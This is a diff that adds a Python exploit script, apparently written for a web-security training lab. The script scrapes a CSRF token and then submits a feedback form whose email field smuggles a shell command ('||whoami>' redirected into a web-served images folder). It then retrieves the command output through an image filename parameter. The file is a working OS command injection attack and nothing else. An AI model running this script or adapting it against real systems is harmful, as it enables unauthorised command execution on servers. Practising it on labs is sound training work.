@@ -1,0 +1,56 @@
+import requests
+import re
+
+session = requests.session()
+base_url = input("Enter the base URL: ").strip().rstrip("/")
+target_url = (f"{base_url}/feedback/submit")
+feedback_url = (f"{base_url}/feedback")
+initial_page = session.get(feedback_url)
+
+print("Finding CSRF Token ..... .... ... .. .")
+csrf_match = re.search(r'name="csrf" value="([^"]+)"', initial_page.text)
+
+if csrf_match:
+    csrf_token = csrf_match.group(1)
+    print(f" ==> Found CSRF Token: {csrf_token}")
+else:
+    print(" ==> Error: Could not find CSRF token on the page.")
+    exit()
+
+payload = {
+    'csrf': csrf_token,
+    'name': "haha",
+    'email': "mypunch@123 ||whoami>/var/www/images/output.txt||",
+    'subject': "Subject_lols",
+    'message': "IwinYoulose"
+}
+
+try:
+    response = session.post(target_url, data=payload, timeout=10)
+except requests.RequestException as e:
+    print(f"[*] Paylaod execution failed: {e}")
+    exit(1)
+
+if response.status_code == 200:
+    print(f"[*] Payload executed Successfully...")
+    print(f"output: \n{response.text.strip()}")
+else:
+    print(f"[*] Exploit failed {response.status_code}")
+
+print("heading to step 2 .....")
+image_url = (f"{base_url}/image")
+payload2 = {
+    'filename': "output.txt"
+}
+
+try:
+    response2 = session.get(image_url, params=payload2, timeout=10)
+except requests.RequestException as e:
+    print(f"[*] Error occured at /image filename handling: {e}")
+    exit(1)
+if response2.status_code == 200:
+    print(f"[*]filename handled..")
+    print(f"output:\n{response2.text.strip()}")
+else:
+    print(f"For (/image) filename handling failed... {response2.status_code}")
+    print(response2.text[:500])
